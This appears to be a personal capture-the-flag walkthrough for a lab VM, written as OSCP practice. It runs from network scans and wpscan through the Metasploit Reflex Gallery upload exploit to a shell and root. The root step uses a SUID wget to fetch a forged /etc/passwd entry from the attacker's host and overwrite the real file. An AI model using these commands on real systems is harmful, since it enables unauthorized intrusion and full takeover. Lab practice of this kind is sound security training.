@@ -1,0 +1,102 @@
+ifconfig -> myIP = 192.168.56.125
+
+netdiscover -r 192.168.56.0/24 -i eth1
+	targetIP = 192.168.56.126
+
+nmap -sC -sV -A -T4 -p- 192.168.56.126
+	Just port 80
+start a nikto and dirb
+	dirb http://192.168.56.126/
+	nikto -h 192.168.56.126
+
+Start taking a look around the website while those run
+Default apache page
+Nikto finds a notes.txt, has a hint to unzip something
+
+dirb finds a wordpress site, bingo
+192.168.56.126/wordpress
+
+let's run a wpscan
+
+wpscan --url 192.168.56.126/wordpress -ep
+
+Finds an out of date plugin called Reflex Gallery 3.1.3
+
+searchsploit reflex -> RCE with and without MS
+
+Using MSF method
+
+msfdb run
+
+workspace -a wordy
+
+search reflex
+
+use exploit/unix/webapp/wp_reflexgallery_file_upload
+
+options
+
+set rhosts 192.168.56.126
+set targeturi /wordpress
+run
+
+get a meterpreter shell hell ye
+
+let's drop into a regular shell
+
+shell
+
+python3 --version
+	3.6.8 cool lets get a tty
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+bash shell nice. let's go look for user flag
+cd /home
+cd raj
+cat flag1.txt (nice)
+
+let's see what has root permissions
+
+find / -user root -perm -4000 2>/dev/null
+
+we have wget as root...how can we use this to our advantage?
+let's overwrite the /etc/passwd file with a root user we add to it.
+
+first cat /etc/passwd and copy all the entries
+
+Go back to target machine and make a file called 'passwd'
+Now let's generate a hashed password using openssl
+Making a user called lol let's do
+
+openssl passwd -1 -salt lol password
+outputted is the hash we will put in our /etc/passwd
+	-> $1$lol$nT3A6TjHyPCMuivziR8Y50
+
+Now let's put our entry in /etc/passwd
+lol:$1$lol$nT3A6TjHyPCMuivziR8Y50:0:0:root:/root:/bin/bash
+
+cool now let's host it on a simple http python server and wget it to overwrite the machines /etc/passwd
+
+on attacking machine, python -m SimpleHTTPServer
+Now back on the victim machine, let's get that file
+cd /etc/
+wget -O passwd http://192.168.56.125:8000/passwd
+
+Great now the user lol is in the system with password  password as root
+let's switch user to it
+
+su lol
+password
+
+boom root
+
+cd /root
+
+cat proof.txt
+niiiiiiiiiiiiiice
+
+Theres other wp plugins that were vulnerable but this was the first one so I just chose to that one. Also, I want to go back and do it without msf just to practice for OSCP, but that's for another day.
+
+gg
+
+
